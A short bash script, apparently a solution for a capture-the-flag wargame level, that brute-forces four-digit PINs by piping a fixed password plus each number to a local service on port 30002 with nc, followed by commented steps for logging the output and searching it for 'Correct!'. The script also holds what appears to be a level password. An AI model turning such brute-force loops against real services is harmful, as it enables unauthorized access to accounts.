#!/bin/bash

for ((i=1111; i<10000; i++))
do

echo "---try" $i "---"
echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $i | nc localhost 30002 &


PID=$(ps | grep [n]c | awk '{print $1}')

kill -9 $PID

echo "---------------"
echo ""

done


# mktemp -d 
# cd /tmp/<temp_dir>
# touch logs txt
# chmod 700 brute_force_script.sh
# ./brute_force_script.sh > logs txt
# vim logs.txt 
# /Correct!
